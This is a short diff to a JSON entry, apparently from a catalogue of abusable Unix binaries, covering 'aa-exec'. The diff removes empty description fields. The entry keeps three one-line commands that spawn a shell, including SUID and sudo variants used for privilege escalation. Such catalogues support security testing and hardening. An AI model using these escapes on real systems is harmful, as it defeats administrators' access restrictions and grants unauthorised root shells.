@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "aa-exec /bin/sh\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./aa-exec /bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo aa-exec /bin/sh\n"
       }
     ]
